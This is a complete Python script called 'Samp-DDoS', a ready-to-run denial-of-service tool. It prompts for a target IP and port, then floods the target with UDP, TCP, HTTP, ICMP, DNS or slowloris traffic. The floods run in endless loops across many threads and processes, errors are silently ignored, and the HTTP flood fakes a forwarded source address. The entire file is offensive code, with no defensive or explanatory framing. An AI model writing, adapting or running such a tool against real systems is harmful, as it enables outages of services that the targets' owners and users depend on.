#===============Samp-DDoS===============
# Developer: VatieraSynth
# Version: 1.0
# Description: This script uses a combination of methods to disable the target.

import os
import socket
import threading
import random
import string
import multiprocessing
from time import time

ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))
threads = int(input("Threads per Attack Engine: "))
packets = int(input("Packets per Thread: "))
flood_type = input("Choose attack type (udp/tcp/http/icmp/dns/slowloris): ").lower()

def rand_data(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

def udp_flood():
    data = rand_data(random.randint(32768, 65500))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data, (ip, port))
            for _ in range(packets):
                s.sendto(data, (ip, port))
        except Exception as e:
            pass

def tcp_flood():
    data = rand_data(random.randint(8192, 16384))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip, port))
            for _ in range(packets):
                s.send(data)
            s.close()
        except Exception as e:
            pass

def http_flood():
    uri = f"/{random.randint(100000, 999999)}"
    headers = (
        f"GET {uri} HTTP/1.1\r\n"
        f"Host: {ip}\r\n"
        f"User-Agent: UltraFloodBot/20000\r\n"
        f"Accept-Encoding: gzip, deflate\r\n"
        f"Connection: Keep-Alive\r\n"
        f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}\r\n"
        f"Cache-Control: no-cache\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for _ in range(packets):
                s.send(headers)
            s.close()
        except Exception as e:
            pass

def icmp_flood():
    data = rand_data(64)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.sendto(data, (ip, 0))
        except Exception as e:
            pass

def dns_flood():
    data = rand_data(512)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data, (ip, 53))
        except Exception as e:
            pass

def slowloris():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(b"Host: " + ip.encode() + b"\r\n")
            while True:
                s.send(b"X-a: " + rand_data(100) + b"\r\n")
        except Exception as e:
            pass

def fusion_attack():
    if flood_type == "udp":
        for _ in range(threads):
            threading.Thread(target=udp_flood).start()
    elif flood_type == "tcp":
        for _ in range(threads):
            threading.Thread(target=tcp_flood).start()
    elif flood_type == "http":
        for _ in range(threads):
            threading.Thread(target=http_flood).start()
    elif flood_type == "icmp":
        for _ in range(threads):
            threading.Thread(target=icmp_flood).start()
    elif flood_type == "dns":
        for _ in range(threads):
            threading.Thread(target=dns_flood).start()
    elif flood_type == "slowloris":
        for _ in range(threads):
            threading.Thread(target=slowloris).start()

def attack():
    print(f"Launching {flood_type.upper()} Attack on {ip}:{port} with {threads} threads.")
    os.system("ulimit -n 999999")
    for _ in range(multiprocessing.cpu_count() * 8):
        multiprocessing.Process(target=fusion_attack).start()

if __name__ == '__main__':
    start_time = time()
    attack()
    print(f"Attack initiated at {time() - start_time:.2f} seconds")
